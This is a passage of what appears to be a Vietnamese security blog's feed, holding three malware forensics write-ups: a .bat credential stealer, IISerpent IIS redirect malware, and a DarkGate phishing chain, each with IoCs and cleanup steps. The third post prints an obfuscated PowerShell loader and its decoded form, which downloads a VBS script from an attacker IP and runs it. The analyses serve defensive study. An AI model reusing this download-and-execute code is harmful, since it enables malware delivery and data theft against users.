        <content type="html"><![CDATA[<h2 id="1-Thong-tin-ban-dau"><a href="#1-Thong-tin-ban-dau" class="headerlink" title="1. Thông tin ban đầu"></a>1. Thông tin ban đầu</h2><p>Gần đây, có một chiến dịch lừa đảo tấn công sử dụng người dùng Windows.<br><img src="/../images/Phishing-tancongnguoidungwindows/mess.PNG"></p><h2 id="2-Phan-tich"><a href="#2-Phan-tich" class="headerlink" title="2. Phân tích"></a>2. Phân tích</h2><h3 id="2-1-So-bo"><a href="#2-1-So-bo" class="headerlink" title="2.1. Sơ bộ"></a>2.1. Sơ bộ</h3><p>Kiểm tra ban đầu, qua cái tên cũng biết được file <code>bat</code> nằm trong tệp <code>zip</code>.<br><img src="/../images/Phishing-tancongnguoidungwindows/check1.PNG"><br>Mẫu này có người kiểm tra trên virustotal 12 ngày trước.<br><img src="/../images/Phishing-tancongnguoidungwindows/check2.PNG"></p><h3 id="2-2-Kiem-tra-chi-tiet"><a href="#2-2-Kiem-tra-chi-tiet" class="headerlink" title="2.2. Kiểm tra chi tiết"></a>2.2. Kiểm tra chi tiết</h3><p>Nhìn qua thì tệp file <code>bat</code> này được obfuscate.<br><img src="/../images/Phishing-tancongnguoidungwindows/check3.PNG"></p><ul><li><p>Tên biến và hàm lạ lùng</p></li><li><p>Ký tự không đọc được<br>Quá trình deobfuscate thì đây chính là nội dung của file <code>bat</code><br><img src="/../images/Phishing-tancongnguoidungwindows/check4.PNG"><br>Quá trình như sau:</p></li></ul><ol><li><p>Khởi động chorme truy vấn đến website: <a href="https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=">https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=</a></p></li><li><p>Đưa file bat vào thư mục Startup để khi khởi động lại máy tính sẽ thực hiện khởi chạy file độc hại này. <code>&quot;C:\\Users\\$UserName\\AppData\\Roaming\\Microsoft\\Windows\\&#39;StartMenu&#39;\\Programs\\Startup\\WindowsSecure.bat&quot;</code> . </p></li><li><p>Khai báo một số biến môi trường</p></li><li><p>Kết nối website <a href="https://school-us[.]store/">https://school-us[.]store/</a> để tải file <code>achung2.zip</code> và giải nén vào thư mục <code>OutFileC:\\Users\\Public\\Windown.zip</code>. Ngày đăng ký domain:17-10-2023</p></li><li><p>Chạy chương trình <code>project.py</code></p></li></ol><p><code>achung2.zip</code> là thư mục chứa thư viện <code>python</code> sử dụng để khởi chạy chương trình <code>project.py</code><br>Nội dung của <code>project.py</code> như sau:</p><p><img src="/../images/Phishing-tancongnguoidungwindows/check6.PNG"></p><p>Đại loại đây là chương trình đánh cắp dữ liệu từ các trình duyệt người dùng Chorme, FireFox, Coccoc, Edge, … vị trí nạn nhân, gửi xóa dữ liệu của người dùng.<br>Các dữ liệu được gửi một bot của ứng dụng Telegram<br><img src="/../images/Phishing-tancongnguoidungwindows/check7.PNG"></p><p>Rồi sau đó thực hiện xóa các dấu vết trên máy tính.<br><img src="/../images/Phishing-tancongnguoidungwindows/check8.PNG"></p><h2 id="3-Ket-luan"><a href="#3-Ket-luan" class="headerlink" title="3. Kết luận"></a>3. Kết luận</h2><p>Mã độc này khá dễ phát hiện, tuy nhiên nó cũng cực kỳ khó chịu khi lấy dữ liệu người dùng.</p><p>Trường hợp máy tính bị nhiễm cần kiểm tra và gỡ bỏ file <code>bat</code> trong thư mục Startup.</p><p>Thay đổi mật khẩu, cookie, token, autofill các website lưu trữ trên trình duyệt.</p><h2 id="4-IoCs"><a href="#4-IoCs" class="headerlink" title="4. IoCs"></a>4. IoCs</h2><p>Domain</p><p><a href="https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=">https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=</a><br><a href="https://school-us[.]store/">https://school-us[.]store/</a></p><p>IP</p><p>104[.]21[.]41[.]5</p><p>File</p><p>SHA256:<br><code>mal.bat</code>:<br>7859f8ac3a70b2e9c73c86aa70d23bdb680179f67057b8d5f05db99266a9b53f</p><p>Folder<br><code>C:\\Users\\Public\\Windown.zip</code><br><code>C:\\Users\\$UserName\\AppData\\Roaming\\Microsoft\\Windows\\&#39;StartMenu&#39;\\Programs\\Startup\\WindowsSecure.bat</code></p><h2 id="Shout-out"><a href="#Shout-out" class="headerlink" title="Shout-out"></a>Shout-out</h2><p>Cảm ơn NexO giới thiệu 1 người bạn có phát hiện <a href="https://vmtien.id.vn/ben-trong-ma-doc-danh-cap-tai-khoan-mang-xa-hoi-co-gi/?fbclid=IwAR3AAxl_PRSNI6-BUOi_WGah4fAYxgKkYFXkxvIohF-4vg51Llo9g3Y5SnI">tương tự</a>. Chi tiết mã nguồn có trong bài viết này. Mẫu này chỉ thay đổi bot telegram nhận thông tin và chỉnh sửa một phần mã python.</p><p><em><strong>Bản kiểm điểm</strong></em>: Lần đầu tiên mình đã không tuân thủ chính sách, trong quá trình viết blog trên thiết bị mới, đã vô tình khởi chạy mã độc.</p><blockquote><p>Giọt nước mắt cuốn ký ức chìm sâu, đừng làm nhau đau</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Forensics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> phishing </tag>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tấn công chuyển hướng website cờ bạc, cá độ</title>
      <link href="/2023/10/21/Tan-cong-chuyen-huong-website-IIS/"/>
      <url>/2023/10/21/Tan-cong-chuyen-huong-website-IIS/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Thong-tin-ban-dau"><a href="#1-Thong-tin-ban-dau" class="headerlink" title="1. Thông tin ban đầu"></a>1. Thông tin ban đầu</h2><p>Năm 2022 - 2023, các website Cổng thông tin điện tử tại Việt Nam hầu hết bị tấn công bởi mã độc khiến chuyển hướng đến các website cờ bạc.<br><img src="/../images/Tan-cong-chuyen-huong-website-IIS/check1.PNG"><br>Thông qua tìm kiếm trên google, các kết quả trả về sẽ chuyển hướng 404 rồi sang website cá độ, cờ bạc.</p><p>Search Engine Optimization (SEO) - Tối ưu hóa công cụ tìm kiếm là quá trình tăng chất lượng và lưu<br>lượng truy cập website bằng cách tăng khả năng hiển thị của website hoặc webpage cho người dùng<br>trên các máy truy tìm dữ liệu như Google</p><p>Tìm kiếm trên công cụ google với các từ khóa liên quan đến cá độ, cờ bạc, với tùy chọn là trang tên miền chứa gov.vn, edu.vn người dùng có thể dễ dàng nhìn thấy nhiều trang có đuôi tên miền *.gov.vn của các cơ quan nhà nước đã bị tấn công “hack” và chèn các đường link quảng cáo, dòng mã độc IISerpent.<br>    IISerpent được triển khai và định cấu hình dưới dạng tiện ích mở rộng độc hại cho IIS – phần mềm máy chủ web của Microsoft. Điều đó cho phép phần mềm độc hại chặn tất cả các yêu cầu HTTP được gửi đến các trang web được lưu trữ bởi máy chủ bị xâm nhập, đồng thời chủ động thay đổi phản hồi HTTP của máy chủ.<br>     Các công cụ tìm kiếm thường xuyên thu thập thông tin trên internet, sau đó lập chỉ mục tất cả nội dung được tìm thấy trực tuyến, xây dựng mối liên hệ giữa cụm từ tìm kiếm và nội dung, đồng thời sử dụng nhiều thuật toán khác nhau để tính toán thứ hạng của kết quả cho các cụm từ tìm kiếm cụ thể.<br>    Khi truy cập vào website như bình thường, nó sẽ lập tức chuyển hướng sang bên thứ 3, các nội dung website này bao gồm cờ bạc, khiêu dâm, …</p><h2 id="2-Mot-loai-ma-doc-tren-he-thong"><a href="#2-Mot-loai-ma-doc-tren-he-thong" class="headerlink" title="2. Một loại mã độc trên hệ thống"></a>2. Một loại mã độc trên hệ thống</h2><p>Ngoài những việc thay đổi <code>config</code> để load một số module trên IIS Server, dưới đây là một số cách loại mã độc này thực hiện.</p><h3 id="2-1-Persistence-Mechanism"><a href="#2-1-Persistence-Mechanism" class="headerlink" title="2.1. Persistence Mechanism"></a>2.1. Persistence Mechanism</h3><p><img src="/../images/Tan-cong-chuyen-huong-website-IIS/check2.PNG"><br>Mã độc duy trì hoạt động trong Windows Service với tham số là một tệp dll độc hại tại <code>C:\\Windows\System32\wpdbusenum.dll</code>. Tệp wpdbusenum.dll đóng vai trò tạo các tệp SEO dll.</p><p>Các tệp độc hại :<br><code>C:\Windows\Logs\CBS\API.log</code><br><code>C:\Windows\Logs\CBS\ART.log</code><br><code>C:\ProgramData\Microsoft\Network\apicgi.dll</code><br><code>C:\ProgramData\Microsoft\Network\apifastcgi.dll</code></p><p>Tiến trình <code>cmd</code> fake thực hiện copy nội dung vào <code>apicgi.dll</code></p><p>Tiến hành đóng dịch vụ IIS, stop service độc hại đang chạy.</p><h3 id="2-2-Ma-doc-duoc-goi-qua-config-file"><a href="#2-2-Ma-doc-duoc-goi-qua-config-file" class="headerlink" title="2.2. Mã độc được gọi qua config file"></a>2.2. Mã độc được gọi qua config file</h3><p>Khi nhận thấy website chuyển hướng đến link cố định, ở đây là <code>baidu.*</code>, file mã độc không obfuscate domain, nên sử dụng rule tìm kiếm để tiết kiệm thời gian.<br>Tiến hành kiểm tra trong thư mục <code>system32</code>.</p><p>yara rule</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rule scan &#123;</span><br><span class="line">    Strings:</span><br><span class="line">        $a = &quot;baidu&quot;</span><br><span class="line">    Condition:</span><br><span class="line">        $a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>yara64.exe .\rulescan.txt -r C:\Windows\System32\inetsrv\</code></p><p>Trường hợp thấy <code>.dll</code> được load, tiến hành dừng dịch vụ IIS.<br>Xóa dòng load Dll trong file config :<br><code>C:\Windows\System32\inetsrv\config\applicatitonHost.config</code><br>Xóa file dll <code>C:\Windows\System32\inetsrv</code></p><h2 id="3-Khac-phuc"><a href="#3-Khac-phuc" class="headerlink" title="3. Khắc phục"></a>3. Khắc phục</h2><h3 id="3-1-Nguyen-nhan-tan-cong"><a href="#3-1-Nguyen-nhan-tan-cong" class="headerlink" title="3.1. Nguyên nhân tấn công"></a>3.1. Nguyên nhân tấn công</h3><p>Với mỗi hệ thống, lại có một nguyên nhân tấn công khác nhau.<br>Về cơ bản, các hệ thống cổng thông tin điện tử có một số lỗ hổng phổ biến như phiên bản Telerik có lỗ hổng: CVE-2019-18935, CVE-2017-11317<br><img src="/../images/Tan-cong-chuyen-huong-website-IIS/check3.png"><br>Poc cho các lỗ hổng này có sẵn.</p><p>Các file upload không kiểm duyệt đuôi file <code>.ashx</code> dẫn đến thực thi webshell.</p><p>Và rất nhiều lỗ hổng khác mà mình chưa rõ thông tin.</p><h3 id="3-2-Xoa-cache-google"><a href="#3-2-Xoa-cache-google" class="headerlink" title="3.2. Xóa cache google"></a>3.2. Xóa cache google</h3><p>Vì khi tìm kiếm Google sẽ hiện lên các website cờ bạc, cá độ, cần report cho Google gỡ các kết quả tìm kiếm này.<br>Thực hiện xóa cache Google theo hưởng dẫn được mô tả chi tiết:<br>Bước 1: Truy cập  Google Search Console và đăng nhấp<br>Bước 2: Chọn nhập tiền tố URL và nhấn tiếp tục<br>Bước 3: Thực hiện xác minh chủ sỡ hữu domain<br>Bước 4: Nhấn xóa sản phẩm<br>Hướng dẫn chi tiết trong hai bài viết sau.<br><a href="https://passwordprotectwp.com/remove-private-content-google-cache/#:~:text=Remove%20your%20Cached%20Pages%20with%20Google%20Search%20Console&text=In%20the%20%E2%80%9CIndex%E2%80%9D%20menu%2C,option%20and%20submit%20your%20request">Remove private content Google cache</a></p><p><a href="https://www.youtube.com/watch?v=h223mCgbmf4">Remove in Search console</a></p><h2 id="4-IoCs"><a href="#4-IoCs" class="headerlink" title="4. IoCs"></a>4. IoCs</h2><p>SHA256<br><code>apicgi.dll</code>: 08f965f640a3ec1c3aa9c31033455fad02550485d0d5b6fe33553d374775f18a</p><p><code>apifastcgi.dll</code>: bf45c48b209e5004520b5d541e406c183bccb2fe81f3974c2c53be48017f74ca</p><p><code>wpdbusenum.dll</code>: aa9efe49bf7846c5f805f077f0d0bf9f0e1e7758fafd9bcf9984d6fc4c20892a</p><h2 id="Shout-out"><a href="#Shout-out" class="headerlink" title="Shout-out"></a>Shout-out</h2><p>Cảm ơn DieuPX.</p>]]></content>
      
      
      <categories>
          
          <category> Forensics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IIS </tag>
            
            <tag> windows </tag>
            
            <tag> IISerpent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tấn công người dùng làm dịch vụ Facebook Ads</title>
      <link href="/2023/10/05/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/"/>
      <url>/2023/10/05/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Thong-tin-ban-dau"><a href="#1-Thong-tin-ban-dau" class="headerlink" title="1. Thông tin ban đầu"></a>1. Thông tin ban đầu</h1><p>Nửa đêm, bạn bè gọi liên quan đến một cuộc phishing máy PC cá nhân.</p><p><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check1.PNG"></p><h1 id="2-Phan-tich"><a href="#2-Phan-tich" class="headerlink" title="2. Phân tích"></a>2. Phân tích</h1><p>Website nạn nhân đã click vào, có một thông báo nếu người dùng chấp nhận click vào sẽ thực hiện lệnh <code>javascript</code>.</p><p><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/website.png"></p><p>View page source ta có thể thấy đường dẫn file ChungLG.js “đáng ngờ”. Sau đó thông qua <code>search-ms</code> đẫn người dùng truy cập đến địa chỉ <code>194.87.31.108:8080</code> để thực hiện tải file độc hại.<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check_bs2.PNG"></p><p>File zip độc hại như sau<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check4.PNG"><br>Đây là 2 file shortcut giả dạng PDF và Excel.</p><p>Nếu không để ý click vào thì khởi động powershell.<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/properties.PNG"></p><p>Lệnh như sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = $env:TEMP + &#x27;\ldOGUevTtt.pdf&#x27;;$secondPath=$env:TEMP+&#x27;\HYFmFrcWvQ.vbs&#x27;;$pHqgh=&#x27;&#x27;;$pHqgh+=&#x27;Invoke-WebRe&#x27;;$WJNzC=690;$pHqgh+=&#x27;quest -Uri &quot;&#x27;;$pHqgh+=&#x27;http://89.23&#x27;;$pHqgh+=&#x27;.100.222:80/&#x27;;$pHqgh+=&#x27;foo/neverban&#x27;;$TjHvT=9796;$pHqgh+=&#x27;_SUCBAm.vbs&quot;&#x27;;$pHqgh+=&#x27; -OutFile $s&#x27;;$pHqgh+=&#x27;econdPath;St&#x27;;$pHqgh+=&#x27;art-Process &#x27;;$TzMnd= $WJNzC+ $WJNzC;$pHqgh+=&#x27;-FilePath $s&#x27;;$pHqgh+=&#x27;econdPath;In&#x27;;$pHqgh+=&#x27;voke-WebRequ&#x27;;$pHqgh+=&#x27;est -Uri &quot;ht&#x27;;$RZjYx=167;$pHqgh+=&#x27;tps://files.&#x27;;$pHqgh+=&#x27;catbox.moe/b&#x27;;$pHqgh+=&#x27;8bf3x.pdf&quot; -&#x27;;$pHqgh+=&#x27;OutFile $pat&#x27;;$yJYYz=9737;$pHqgh+=&#x27;h;Start-Proc&#x27;;$pHqgh+=&#x27;ess -FilePat&#x27;;$pHqgh+=&#x27;h $path;&#x27;;.([char](21*5) + [char](51+50) + [char](20*6)) $pHqgh;</span><br></pre></td></tr></table></figure><p>Thực hiện deobfuscation đoạn powershell script thu được:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://89.23.100.222:80/foo/neverban_SUCBAm.vbs&quot; -OutFile $secondPath;</span><br><span class="line">Start-Process -FilePath $secondPath;</span><br><span class="line">Invoke-WebRequest -Uri &quot;https://files.catbox.moe/b8bf3x.pdf&quot; -OutFile $path;</span><br><span class="line">Start-Process -FilePath $path;</span><br></pre></td></tr></table></figure><p>Khi đoạn powershell được thực thi download và lưu file nerverba_SUCBAm.vbs lưu tại $path &#x3D; $env:TEMP</p><p>Nội dung file <code>.vbs</code><br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check6.PNG"><br>Đoạn mã này thực hiện lấy tất cả các tiến trình trên máy tính nạn nhân rồi gửi về server <code>http://vntricker.abcxzy.com:2351/nlhsapgv</code> và sau đó nhận phản hồi qua đoạn message.<br>Nội dung của đoạn mesage được làm rối khi gửi lên thì nhận về nội dung như sau.</p><p><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/response.png"></p><p>Lệnh hình trên với chức năng tải tệp thực thi Autoit.exe và tệp autoit script(.au3) độc hại và thực thi nó.</p><p>Nội dụng file autoscript độc hại sau khi trích xuất:<br>Thực hiện deobfuscation đoạn  thu được:<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check_bs1.PNG"></p><p>Ban đầu tưởng file này bình thường, hóa ra rất là phức tạp, blog <a href="https://0xtoxin.github.io/threat%20breakdown/DarkGate-Camapign-Analysis/">mô tả chi tiết</a> liên quan đến mã độc này.</p><h1 id="3-Khac-phuc"><a href="#3-Khac-phuc" class="headerlink" title="3. Khắc phục"></a>3. Khắc phục</h1><p>Gỡ toàn bộ file zip, vbs, ..</p><p>Các tiến trình chạy trong hệ thống.</p><h1 id="4-IoCs"><a href="#4-IoCs" class="headerlink" title="4. IoCs"></a>4. IoCs</h1><p>Domain:<br><a href="https://lingiangcosmetic[.]com/quotation">https://lingiangcosmetic[.]com/quotation</a><br><a href="https://files[.]catbox[.]moe">https://files[.]catbox[.]moe</a><br><a href="http://vntricker[.]abcxzy[.]com:2351">http://vntricker[.]abcxzy[.]com:2351</a></p><p>SHA256:<br><code>Lingiang_..._2023.zip</code>:<br>8ff7faad4b645852b54c7be621264b8b1a2d97c14119d45dd27d7f69c272272f</p><p><code>SUCBAm.vbs</code>:<br>1fedd78764fa7c35d5b43b1a9e7111dfa318d3a751e3a819d9d0cc75b69403a0</p><p><code>Cosmetic-...-09-2023</code>:<br>64dd55e1c2373deed25c2776f553c632e58c45e56a0e4639dfd54ee97eab9c19</p><p><code>Lingiang_.._Brief_2023</code>:<br>64dd55e1c2373deed25c2776f553c632e58c45e56a0e4639dfd54ee97eab9c19</p><p>IP:<br>89[.]23[.]100[.]222<br>194[.]87[.]31[.]108</p><h2 id="Shout-out"><a href="#Shout-out" class="headerlink" title="Shout-out"></a>Shout-out</h2><p>Cảm ơn DuongHC.</p>]]></content>
      
      
      <categories>
          
          <category> Forensics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> Ink </tag>
            
            <tag> phishing </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
